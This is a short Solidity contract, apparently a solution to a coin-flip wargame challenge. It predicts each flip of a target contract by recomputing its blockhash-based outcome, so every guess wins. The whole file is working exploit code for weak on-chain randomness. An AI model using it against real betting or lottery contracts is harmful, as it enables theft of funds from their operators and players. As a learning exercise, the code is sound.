// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
    function consecutiveWins() external view returns (uint256);
}

contract CoinFlipGuesser {
    uint256 private constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    ICoinFlip public immutable cf;

    constructor(address coinFlip) {
        cf = ICoinFlip(coinFlip);
    }

    function guess() public returns (bool, uint256) {
        uint256 blockValue = uint256(blockhash(block.number - 1)); // computing logic same as in CoinFlip.sol
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        bool result = cf.flip(side);

        uint256 wins = cf.consecutiveWins();
        return (result, wins); // returns consecutive wins and result of the current round
    }
}